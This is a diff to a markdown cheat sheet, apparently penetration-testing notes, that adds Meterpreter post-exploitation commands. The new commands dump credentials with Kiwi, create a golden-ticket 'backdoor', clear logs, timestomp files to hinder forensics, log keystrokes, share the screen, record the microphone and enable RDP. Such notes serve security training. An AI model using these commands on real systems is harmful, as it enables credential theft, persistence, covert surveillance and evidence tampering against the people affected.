@@ -208,7 +208,28 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 # suggest exploits
 # this doesn't work well on x64
 ```
+
+Note: you can use `sessions sid` in the meterpreter, which is like `sessions -i sid` in the msfconsole. You can use `background` to go back to the msfconsole, for instance, to run another exploit.
 </div><div>
+
+To access a service, we need to be "in" a process that has the same architecture, and the same permissions, that our target. Usually, look for process run by "NT AUTHORITY\SYSTEM" (root).
+
+```bash
+meterpreter > ps # list process
+meterpreter > migrate process_pid # move to another process
+meterpreter > migrate -N process_name # same
+```
+
+<details class="details-e">
+<summary>Dump in-memory password with Mimikatz/Kiwi</summary>
+
+```bash
+meterpreter > load kiwi
+meterpreter > creds_all # retrieve all credentials
+# later, you may use it to create a "backdoor"
+meterpreter > golden_ticket_create
+```
+</details>
 
 Once you are admin
 
@@ -217,6 +238,7 @@ meterpreter > getsystem
 meterpreter > hashdump # dump usernames/password...
 # try to bruteforce NTML with john format=nt
 meterpreter > clearev # clean logs
+meterpreter > timestomp # modify timestamp to complicate forensics
 ```
 
 Other commands
@@ -257,31 +279,52 @@ meterpreter > webcam_snap
 <summary>Take a screenshot</summary>
 
 ```bash
-meterpreter > ps # find explorer.exe
-[...]
-1908 1284  explorer.exe [...]
-[...]
-meterpreter > migrate 1908
+meterpreter > migrate -N explorer.exe
 meterpreter > use espia
 meterpreter > screengrab
 ```
+
+You may also use `screenshot` 📌.
 </details>
 
 <details class="details-e">
 <summary>Install a key logger</summary>
 
 ```bash
-meterpreter > ps # find explorer.exe
-[...]
-1908 1284  explorer.exe [...]
-[...]
-meterpreter > migrate 1908
+meterpreter > migrate -N explorer.exe
 meterpreter > keyscan_start # start
 meterpreter > keyscan_dump # dump keys
 ```
 </details>
 
-Note: you can use `sessions sid` in the meterpreter, which is like `sessions -i sid` in the msfconsole.
+<details class="details-e">
+<summary>Watch the screen in real time</summary>
+
+Watch the remote user desktop in real time
+
+```bash
+meterpreter > screenshare
+meterpreter > record_mic # Record audio from the default microphone for X seconds
+```
+</details>
+
+<details class="details-e">
+<summary>Record microphone</summary>
+
+Record audio from the default microphone for X seconds
+
+```bash
+meterpreter > record_mic
+```
+</details>
+
+<details class="details-e">
+<summary>Enable Remote Desktop Protocol</summary>
+
+```bash
+meterpreter > run post/windows/manage/enable_rdp
+```
+</details>
 </div></div>
 
 <hr class="sr">
